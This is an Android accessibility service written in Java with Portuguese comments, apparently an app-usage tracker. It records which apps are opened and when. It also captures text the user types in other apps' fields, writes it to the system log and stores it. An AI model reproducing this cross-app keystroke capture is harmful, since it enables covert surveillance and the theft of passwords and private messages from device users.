package vox.com.br.services;

import static androidx.constraintlayout.helper.widget.MotionEffect.TAG;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Objects;

import vox.com.br.dao.AppAbertoDao;
import vox.com.br.model.AppAberto;

public class MyAccessibilityService extends AccessibilityService {

    // Foi mal pelo código ruim, com tempo pode ter certeza que vou melhorar (pelo menos está funcionando)
    // Quando acontecer um Evento de acessibilidade, esse código é executado
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        Log.e(TAG, "onAccessibilityEvent: ");

        // Pegando uma Instância do AppAbertoDao para receber e popular os dados
        AppAbertoDao appAbertoDao = new AppAbertoDao();

        // Aqui pegamos o nome do pacote do evento estamos usando: (TYPE_WINDOW_STATE_CHANGED)
        String nomeDoApp = accessibilityEvent.getPackageName().toString();

        // Resgatando o Horário com Calendar
        Calendar now = Calendar.getInstance();
        String horarioDoOcorrido = now.get(Calendar.HOUR_OF_DAY) + ":" + now.get(Calendar.MINUTE) + ":" + now.get(Calendar.SECOND);

        PackageManager packageManager = this.getPackageManager();
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.HOME");

        try {
            // Resgatando o nome do App
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
            CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);

            // Resgando oq está sendo digitado pelo usuário em um TextEdit
            List<String> textoDigitado = new ArrayList<>();
            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                Log.e(TAG, "onAccessibilityEvent: "+ accessibilityEvent.getText().get(0).toString() );
                textoDigitado.add(accessibilityEvent.getText().get(0).toString());

                Log.e(TAG, "onAccessibilityEvent: " + textoDigitado);
                AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);
                appAbertoDao.atualizarDigitados(appAbertoAtual);
            }

            // Criando uma intância do AppAberto
            AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);

            // Verificando se existe algo no historico (se não existe quer dizer que o app está iniciando agora)
            if (appAbertoDao.getTodosHistorico().isEmpty()) {
                appAbertoDao.salvarNoHistorico(appAbertoAtual);
                appAbertoDao.salvar(appAbertoAtual);
            } else if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
                // nada pode acontecer pois o evento é para atualizar o que foi digitado
            } else  { // Executado quando for e evento mudança no estado da tela, e não for a primeira vez iniciando

                // Verificando se mudou o App, Aqui pego o último item no Historico e comparo o app atual.
                // Se eles forem iguais quer dizer que houve uma mudança no estado da tela do mesmo app, e não precisamos fazer nada sobre pois estamos no msm app.
                if (!Objects.equals(appAbertoDao.getTodosHistorico().get(appAbertoDao.getTodosHistorico().size() - 1).getNome(), appAbertoAtual.getNome())) {

                    appAbertoDao.salvarNoHistorico(appAbertoAtual);
                    appAbertoDao.salvar(appAbertoAtual);

                    // Resgando o último app aberto registrado para comparar depois
                    AppAberto ultimoAppAberto = appAbertoDao.getTodos().get(appAbertoDao.getTodos().size() - 1); // pegando o último item da lista getTodos()

                    // último item do historico deve ser diferente do ultimo app aberto (precisamos disso?)
                    if (!Objects.equals(appAbertoDao.getTodosHistorico().get(appAbertoDao.getTodosHistorico().size() -1).getNome(), ultimoAppAberto.getNome())) {

                        // penultimo item do historico deve ser igual o ultimo app registrado
                        if(Objects.equals(appAbertoDao.getTodosHistorico().get(appAbertoDao.getTodosHistorico().size() -2).getNome(), ultimoAppAberto.getNome())) {
                            appAbertoDao.atualizarHorario(ultimoAppAberto, appAbertoAtual);
                        }
                    }
                }
            }
        } catch (PackageManager.NameNotFoundException e) { // Se não achar o nome uma exception é lançada (oq n irá acontecer)
            throw new RuntimeException(e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "onInterrupt: Algo deu errado");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        // Eventos de acessibilidade
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes =
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;

        info.notificationTimeout = 100;

        this.setServiceInfo(info);

        // Quando uma conexão com o serviço foi estabelecida (variável para manipular isso?)
        Log.e(TAG, "onServiceConnected: ");
    }
}
